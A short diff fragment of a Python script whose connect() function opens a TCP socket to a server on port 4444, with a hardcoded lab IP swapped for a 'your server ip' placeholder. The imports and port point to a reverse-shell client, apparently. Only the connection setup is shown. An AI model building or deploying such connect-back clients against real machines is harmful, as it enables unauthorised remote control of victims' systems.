@@ -2,7 +2,7 @@ import socket,os,subprocess,sys,platform
 
   
 def connect():
-    SERVER = '192.168.56.1'
+    SERVER = 'your server ip'
     PORT = 4444
     global s
     s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)
